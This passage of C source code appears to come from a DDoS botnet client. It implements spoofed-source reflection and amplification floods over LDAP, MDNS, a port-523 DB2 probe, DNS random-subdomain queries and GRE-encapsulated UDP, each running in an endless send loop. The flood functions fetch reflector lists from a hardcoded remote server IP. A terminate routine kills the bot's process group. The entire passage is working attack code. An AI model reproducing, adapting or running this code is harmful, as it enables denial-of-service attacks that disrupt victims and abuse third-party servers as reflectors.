		printf("Processed reflector %d.%d.%d.%d\n", f[i].address & 0xff, (f[i].address >> 8) & 0xff, (f[i].address >> 16) & 0xff, (f[i].address >> 24) & 0xff);
		#endif
	}

	#ifdef DEBUG
	printf("Successfully processed reflectors\n");
	#endif

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;

		data[i] = (char *)calloc(256, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);

		ip_header->ihl = 5;
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
		ip_header->id = htons(0xffff);
		ip_header->frag_off = 0;
		ip_header->ttl = 255;
		ip_header->protocol = IPPROTO_UDP;
		// Set the source address to the target address
		ip_header->saddr = t[i].address;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(523);
		util_memcpy(udp_header + sizeof(struct udphdr), "\x44\x42\x32\x47\x45\x54\x41\x44\x44\x52\x00\x53\x51\x4c\x30\x35\x30\x30\x30\x00", 20);
		udp_header->len = htons(sizeof(struct udphdr) + 20);
	}

	while(TRUE)
	{
		if(j == MAX_REFLECTORS)
			j = 0;
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;
		
			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			// Set the destination address to a reflector
			ip_header->daddr = f[j].address;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// UDP header checksum
			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct iphdr) + sizeof(struct udphdr) + 20);

			#ifdef DEBUG
			printf("Sending PORTMAP!\n");
			#else
			sendto(fd2, d, sizeof(struct iphdr) + sizeof(struct udphdr) + 20, 0, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
		j++;
	}
}

// LDAP amplification flood
void flood_ldap(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In LDAP\n");
	#endif
	int i = 0;
	struct reflectors *f;
	int fd = -1;
	struct sockaddr_in dest_addr;
	struct resolve *dns;
	struct entry *e;
	char buf[DNS_TXT_MAX_SIZE];
	char buf2[MAX_REFLECTORS * 4 + 1];
	int ret = 0;
	char *s = buf2;
	int fd2 = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int j = 0;
	struct request r;

	r.vector = htons(VECTOR_LDAP);
	r.count = htonl(MAX_REFLECTORS);

	if((fd2 = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize the raw socket, check your privileges\n");
		#endif
		free(data);
		return;
	}

	i = 1;

	if(setsockopt(fd2, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		free(data);
		close(fd2);
		return;
    }

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		close(fd2);
		free(data);
		return;
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(REFLECTOR_SERVER_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(159,65,8,143);

	if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the reflector server, returning\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Connected to the reflector server!\n");
	#endif

	if(send(fd, &r, sizeof(r), MSG_NOSIGNAL) < 1)
	{
		#ifdef DEBUG
		printf("Failed to request the vector/count\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Successfully requested %d reflectors\n", ntohl(r.count));
	#endif

	ret = recv(fd, buf2, MAX_REFLECTORS * 4 + 1, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to retrieve reflectors\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Processing reflectors...\n");
	#endif

	f = (struct reflectors *)calloc(MAX_REFLECTORS, sizeof(struct reflectors));
	for(i = 0; i < MAX_REFLECTORS; i++)
	{
		f[i].address = *((uint32_t *)s);
		s += sizeof(uint32_t);
		#ifdef DEBUG
		printf("Processed reflector %d.%d.%d.%d\n", f[i].address & 0xff, (f[i].address >> 8) & 0xff, (f[i].address >> 16) & 0xff, (f[i].address >> 24) & 0xff);
		#endif
	}

	#ifdef DEBUG
	printf("Successfully processed reflectors\n");
	#endif

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;

		data[i] = (char *)calloc(256, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);

		ip_header->ihl = 5;
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 51);
		ip_header->id = htons(0xffff);
		ip_header->frag_off = 0;
		ip_header->ttl = 255;
		ip_header->protocol = IPPROTO_UDP;
		// Set the source address to the target address
		ip_header->saddr = t[i].address;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(389);
		util_memcpy(udp_header + sizeof(struct udphdr), "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", 51);
		udp_header->len = htons(sizeof(struct udphdr) + 51);
	}

	while(TRUE)
	{
		if(j == MAX_REFLECTORS)
			j = 0;
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;
		
			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			// Set the destination address to a reflector
			ip_header->daddr = f[j].address;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// UDP header checksum
			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct iphdr) + sizeof(struct udphdr) + 51);

			#ifdef DEBUG
			printf("Sending LDAP!\n");
			#else
			sendto(fd2, d, sizeof(struct iphdr) + sizeof(struct udphdr) + 51, 0, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
		j++;
	}
}

// MDNS amplification flood
void flood_mdns(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In MDNS\n");
	#endif
	int i = 0;
	struct reflectors *f;
	int fd = -1;
	struct sockaddr_in dest_addr;
	struct resolve *dns;
	struct entry *e;
	char buf[DNS_TXT_MAX_SIZE];
	char buf2[MAX_REFLECTORS * 4 + 1];
	int ret = 0;
	char *s = buf2;
	int fd2 = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int j = 0;
	struct request r;

	r.vector = htons(VECTOR_MDNS);
	r.count = htonl(MAX_REFLECTORS);

	if((fd2 = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize the raw socket, check your privileges\n");
		#endif
		free(data);
		return;
	}

	i = 1;

	if(setsockopt(fd2, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		free(data);
		close(fd2);
		return;
    }

	if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		close(fd2);
		free(data);
		return;
	}


	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(REFLECTOR_SERVER_PORT);
	dest_addr.sin_addr.s_addr = INET_ADDR(159,65,8,143);

	if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to connect to the reflector server, returning\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Connected to the reflector server!\n");
	#endif

	if(send(fd, &r, sizeof(r), MSG_NOSIGNAL) < 1)
	{
		#ifdef DEBUG
		printf("Failed to request the vector/count\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Successfully requested %d reflectors\n", ntohl(r.count));
	#endif

	ret = recv(fd, buf2, MAX_REFLECTORS * 4 + 1, 0);
	if(ret < 1)
	{
		#ifdef DEBUG
		printf("Failed to retrieve reflectors\n");
		#endif
		free(dns);
		close(fd);
		close(fd2);
		free(data);
		return;
	}

	#ifdef DEBUG
	printf("Processing reflectors...\n");
	#endif

	f = (struct reflectors *)calloc(MAX_REFLECTORS, sizeof(struct reflectors));
	for(i = 0; i < MAX_REFLECTORS; i++)
	{
		f[i].address = *((uint32_t *)s);
		s += sizeof(uint32_t);
		#ifdef DEBUG
		printf("Processed reflector %d.%d.%d.%d\n", f[i].address & 0xff, (f[i].address >> 8) & 0xff, (f[i].address >> 16) & 0xff, (f[i].address >> 24) & 0xff);
		#endif
	}

	#ifdef DEBUG
	printf("Successfully processed reflectors\n");
	#endif

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;

		data[i] = (char *)calloc(256, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);

		ip_header->ihl = 5;
		ip_header->version = 4;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 46);
		ip_header->id = htons(0xffff);
		ip_header->frag_off = 0;
		ip_header->ttl = 255;
		ip_header->protocol = IPPROTO_UDP;
		// Set the source address to the target address
		ip_header->saddr = t[i].address;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(5353);
		util_memcpy(udp_header + sizeof(struct udphdr), "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09\x5F\x73\x65\x72\x76\x69\x63\x65\x73\x07\x5F\x64\x6E\x73\x2D\x73\x64\x04\x5F\x75\x64\x70\x05\x6C\x6F\x63\x61\x6C\x00\x00\x0C\x00\x01", 46);
		udp_header->len = htons(sizeof(struct udphdr) + 46);
	}

	while(TRUE)
	{
		if(j == MAX_REFLECTORS)
			j = 0;
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);

			// Update the IP header
			if(ip_header->id == 0xffff)
				ip_header->id = rand_new() & 0xffff;
		
			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			// Set the destination address to a reflector
			ip_header->daddr = f[j].address;

			// IP header checksum
			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			// UDP header checksum
			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct iphdr) + sizeof(struct udphdr) + 46);

			#ifdef DEBUG
			printf("Sending MDNS!\n");
			#else
			sendto(fd2, d, sizeof(struct iphdr) + sizeof(struct udphdr) + 46, 0, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
		j++;
	}
}

void flood_dns(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In DNS!\n");
	#endif
	int i = 0;
	int fd = -1;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	uint16_t dns_id = rand_new() % 0xffff;
	uint32_t resolver = get_random_dns_resolver();

	if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initilize raw socket, check your privileges\n");
		#endif
		return;
	}

	i = 1;

	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		close(fd);
		return;
	}

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;
		struct dnshdr *dns_header;
		struct dns_question *dns_q;
		char *query_name;

		data[i] = (char *)calloc(900, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
		udp_header = (struct udphdr *)(ip_header + 1);
		dns_header = (struct dnshdr *)(udp_header + 1);
		query_name = (char *)(dns_header + 1);

		ip_header->version = 4;
		ip_header->ihl = 5;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 15 + t[i].domain_len + sizeof(struct dns_question));
		ip_header->id = htons(0xffff);
		ip_header->ttl = 64;
		ip_header->protocol = IPPROTO_UDP;
		ip_header->saddr = LOCAL_ADDRESS;
		ip_header->daddr = resolver;

		udp_header->source = htons(0xffff);
		udp_header->dest = htons(53);
		udp_header->len = htons(sizeof(struct udphdr) + sizeof(struct dnshdr) + 15 + t[i].domain_len + sizeof(struct dns_question));
		
		dns_header->id = dns_id;
		dns_header->options = htons(1 << 8);
		dns_header->qd_count = htons(1);

		domain_to_name(query_name, t[i].domain, t[i].domain_len);
	
		dns_q = (struct dns_question *)(query_name + t[i].domain_len + 2);
		dns_q->query_type = htons(QUERY_TYPE_A);
		dns_q->query_class = htons(QUERY_CLASS_IP);
	}

	while(TRUE)
	{
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
			struct iphdr *ip_header = (struct iphdr *)d;
			struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);
			struct dnshdr *dns_header = (struct dnshdr *)(udp_header + 1);
			char *query_name = (char *)(dns_header + 1);

			// Update the IP header
			if(ip_header->id = 0xffff)
				ip_header->id = rand_new() & 0xffff;

			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			rand_string(query_name, 12);

			ip_header->check = 0;
			ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

			udp_header->check = 0;
			udp_header->check = tcp_udp_header_checksum(ip_header, udp_header, udp_header->len, sizeof(struct udphdr) + sizeof(struct dnshdr) + 15 + t[i].domain_len + sizeof(struct dns_question));
		
			t[i].dest_addr.sin_addr.s_addr = resolver;
			t[i].dest_addr.sin_port = udp_header->dest;
			#ifdef DEBUG
			printf("Sending DNS!\n");
			#else
			sendto(fd, d, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 15 + t[i].domain_len + sizeof(struct dns_question), MSG_NOSIGNAL, (struct sockaddr_in *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
	}
}

void flood_gre(struct target *t, uint16_t port, uint8_t num_of_targets)
{
	#ifdef DEBUG
	printf("In GRE!\n");
	#endif
	int fd = -1;
	int i = 0;
	char **data = (char **)calloc(num_of_targets, sizeof(char **));
	int p_size = 1400;

	if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to initlize raw socket, check your privileges\n");
		#endif
		return;
	}

	i = 1;

	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
	{
		#ifdef DEBUG
		printf("Failed to set IP_HDRINCL\n");
		#endif
		close(fd);
		return;
	}

	for(i = 0; i < num_of_targets; i++)
	{
		struct iphdr *ip_header;
		struct udphdr *udp_header;
		struct grehdr *gre_header;
		struct iphdr *gre_ip_header;
		char *d;

		data[i] = (char *)calloc(p_size + 110, sizeof(char *));

		ip_header = (struct iphdr *)data[i];
        gre_header = (struct grehdr *)(ip_header + 1);
        gre_ip_header = (struct iphdr *)(gre_header + 1);
		udp_header = (struct udphdr *)(gre_ip_header + 1);
		d = (char *)(udp_header + 1);

		ip_header->version = 4;
		ip_header->ihl = 5;
		ip_header->tos = 0;
		ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + p_size);
		ip_header->id = htons(0xffff);
		ip_header->ttl = 64;
		ip_header->frag_off = htons(1 << 14);
		ip_header->protocol = IPPROTO_GRE;
		ip_header->saddr = LOCAL_ADDRESS;
		ip_header->daddr = t[i].address;

		gre_header->protocol = htons(ETH_P_IP);

		gre_ip_header->version = 4;
		gre_ip_header->ihl = 5;
		gre_ip_header->tos = 0;
		gre_ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + p_size);
		gre_ip_header->id = htons(0xffff);
		gre_ip_header->ttl = 64;
		gre_ip_header->frag_off = htons(1 << 14);
		gre_ip_header->protocol = IPPROTO_UDP;
		gre_ip_header->saddr = rand_new();
		gre_ip_header->daddr = ~(gre_ip_header->saddr - 1024);
	
		udp_header->source = htons(0xffff);
        udp_header->dest = htons(port);
		udp_header->len = htons(sizeof(struct udphdr) + p_size);

		rand_string(d, p_size);
	}

	while(TRUE)
	{
		for(i = 0; i < num_of_targets; i++)
		{
			char *d = data[i];
            struct iphdr *ip_header = (struct iphdr *)d;
            struct grehdr *gre_header = (struct grehdr *)(ip_header + 1);
            struct iphdr *gre_ip_header = (struct iphdr *)(gre_header + 1);
            struct udphdr *udp_header = (struct udphdr *)(gre_ip_header + 1);
		
			// Update the IP header
			if(ip_header->id == 0xffff)
            {
                ip_header->id = rand_new() & 0xffff;
                gre_ip_header->id = ~(ip_header->id - 1000);
			}

			// Update the UDP header
			if(udp_header->source == 0xffff)
				udp_header->source = rand_new() & 0xffff;

			if(udp_header->dest == 0xffff)
				udp_header->dest = rand_new() & 0xffff;
		
			gre_ip_header->daddr = ip_header->daddr;
		
			// IP header checksum
			ip_header->check = 0;
            ip_header->check = ip_header_checksum((uint16_t *)ip_header, sizeof(struct iphdr));

            gre_ip_header->check = 0;
            gre_ip_header->check = ip_header_checksum((uint16_t *)gre_ip_header, sizeof(struct iphdr));

            udp_header->check = 0;
            udp_header->check = tcp_udp_header_checksum(gre_ip_header, udp_header, udp_header->len, sizeof(struct udphdr) + p_size);

            t[i].dest_addr.sin_family = AF_INET;
            t[i].dest_addr.sin_addr.s_addr = ip_header->daddr;
			t[i].dest_addr.sin_port = 0;
			#ifdef DEBUG
			printf("Sending GRE!\n");
			#else
			sendto(fd, d, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + p_size, MSG_NOSIGNAL, (struct sockaddr *)&t[i].dest_addr, sizeof(t[i].dest_addr));
			#endif
		}
	}
}

// Utilities
void terminate_instance(void)
{
	#ifdef DEBUG
	printf("Terminating instance!\n");
	#endif
	#ifdef TSUNAMI_SCAN
	kill_scan();
	#endif
	kill(parent_gid * -1, 9);
	exit(0);
	return;
}
#endif
